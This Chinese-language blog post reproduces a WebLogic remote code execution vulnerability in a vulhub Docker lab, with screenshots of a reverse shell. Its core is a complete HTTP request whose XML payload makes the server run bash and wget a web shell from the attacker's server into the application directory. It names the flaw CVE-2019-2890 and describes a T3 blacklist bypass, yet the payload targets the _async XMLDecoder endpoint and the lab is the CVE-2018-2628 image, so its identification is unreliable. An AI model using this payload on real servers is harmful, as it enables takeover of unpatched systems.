_posts/2020-07-11-WebLogic 反序列化漏洞(CVE-2019-2890).md

---
layout: post
title: WebLogic 反序列化漏洞
tags: WebLogic
categories: CVE-2019-2890
---

# WebLogic 反序列化漏洞(CVE-2019-2890)

## 漏洞描述

Weblogic在利用T3协议进行远程资源加载调用时，默认会进行黑名单过滤以保证反序列化安全。本漏洞绕过了Weblogic的反序列化黑名单，使攻击者可以通过T3协议对存在漏洞的Weblogic组件实施远程攻击。由于T3协议在Weblogic控制台开启的情况下默认开启，而Weblogic默认安装会自动开启控制台，所以攻击者可通过此漏洞造成远程代码执行，以控制Weblogic服务器。

## 漏洞复现

环境部署是使用的GitHub中的[vulhub](!https://github.com/vulhub/vulhub.git)项目（CVE-2018-2628)docker一键部署的。
环境启动后，访问`http://your-ip:7001/_async/AsyncResponseService`，出现下图页面可能存在漏洞。

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2019-2890/15945423904010.jpg)

首先在公网服务器上放一个shell

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2019-2890/15945457310047.jpg)

然后发送数据包，通过wget下载shell，必须是POST请求，Content-Type: text/xml，发送后可以看到响应中HTTP/1.1 202 Accepted，说明下载成功

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2019-2890/15945485124179.jpg)

进入容器可以看到下载成功

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2019-2890/15945486279422.jpg)

然后访问shell地址，执行命令

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2019-2890/15945481744176.jpg)

或者发送数据包反弹shell

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2019-2890/15945479798537.jpg)

攻击机开启监听，成功反弹shell

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2019-2890/15945480313087.jpg)

```
POST /_async/AsyncResponseService HTTP/1.1
Host: weblogic-IP:7001
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 856
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
<soapenv:Header>
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>wget http://公网服务器IP:8080/shell.txt -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/shell.jsp</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
```

## 受影响版本

WebLogic Server 10.3.6.0

WebLogic Server 12.1.3.0

WebLogic Server 12.2.1.3

## 参考链接

https://blog.csdn.net/SouthWind0/article/details/102654374